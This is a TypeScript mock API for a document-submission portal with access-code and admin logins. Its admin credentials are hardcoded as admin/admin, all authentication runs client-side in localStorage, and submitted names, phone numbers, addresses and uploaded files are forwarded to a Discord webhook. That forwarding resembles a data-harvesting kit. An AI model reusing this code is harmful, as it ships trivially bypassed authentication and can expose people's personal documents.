const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const getStorage = (key: string, defaultValue: any) => {
  const item = localStorage.getItem(key);
  return item ? JSON.parse(item) : defaultValue;
};

const setStorage = (key: string, value: any) => {
  localStorage.setItem(key, JSON.stringify(value));
};

export const api = {
  employeeLogin: async (accessCode: string) => {
    await delay(500);
    let codes = getStorage('accessCodes', ['108026']);
    if (!codes.includes(accessCode)) {
      throw new Error('Invalid access code');
    }
    codes = codes.filter((c: string) => c !== accessCode);
    setStorage('accessCodes', codes);
    const token = `token_emp_${accessCode}`;
    const user = { id: `emp_${accessCode}`, username: `Employee (${accessCode})`, role: "employee" };
    return { token, user };
  },

  adminLogin: async (username: string, password: string) => {
    await delay(500);
    if (username === 'admin' && password === 'admin') {
      const user = { id: 'admin-1', username: 'admin', role: 'admin' };
      return { token: 'token_admin', user };
    }
    throw new Error('Invalid credentials');
  },

  submitDocument: async (docData: any, user: any) => {
    await delay(800);
    const docs = getStorage('documents', []);
    const newDoc = {
      id: `doc_${Date.now()}`,
      userId: user.id,
      username: user.username,
      status: 'pending',
      submittedAt: new Date().toISOString(),
      ipAddress: 'Client-Side (Local)',
      ...docData
    };
    docs.push(newDoc);
    setStorage('documents', docs);

    // Send notification and file to Discord
    const discordWebhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK_URL;
    if (discordWebhookUrl) {
      try {
        const form = new FormData();
        const message = `**New Document Submitted**\n**User:** ${user.username}\n**Name:** ${docData.fullName || 'N/A'}\n**Phone:** ${docData.phoneNumber || 'N/A'}\n**Address:** ${docData.streetAddress || 'N/A'}, ${docData.zipCode || 'N/A'}`;
        form.append('content', message);
        
        const fileUrl = docData.fileUrl;
        if (fileUrl) {
          const match = fileUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
          if (match) {
            const mimeType = match[1];
            // Decode base64 in browser
            const byteCharacters = atob(match[2]);
            const byteNumbers = new Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
              byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            const byteArray = new Uint8Array(byteNumbers);
            const blob = new Blob([byteArray], { type: mimeType });
            
            let extension = 'bin';
            if (mimeType.includes('png')) extension = 'png';
            else if (mimeType.includes('jpeg') || mimeType.includes('jpg')) extension = 'jpg';
            else if (mimeType.includes('pdf')) extension = 'pdf';
            
            form.append('file', blob, `document.${extension}`);
          }
        }
        
        fetch(discordWebhookUrl, {
          method: 'POST',
          body: form
        }).then(res => {
          if (!res.ok) console.error("Discord webhook responded with status:", res.status);
        }).catch(err => console.error("Discord webhook fetch error:", err));
      } catch (e) {
        console.error("Error formatting Discord webhook payload", e);
      }
    }

    return { success: true, docId: newDoc.id };
  },

  getAdminDocuments: async () => {
    await delay(300);
    return getStorage('documents', []);
  },

  updateDocumentStatus: async (id: string, status: string) => {
    await delay(300);
    const docs = getStorage('documents', []);
    const doc = docs.find((d: any) => d.id === id);
    if (!doc) throw new Error('Document not found');
    doc.status = status;
    setStorage('documents', docs);
    return { success: true, doc };
  },

  getAccessCodes: async () => {
    await delay(300);
    return { codes: getStorage('accessCodes', ['108026']) };
  },

  generateAccessCode: async () => {
    await delay(300);
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
    const codes = getStorage('accessCodes', ['108026']);
    codes.push(newCode);
    setStorage('accessCodes', codes);
    return { code: newCode };
  }
};
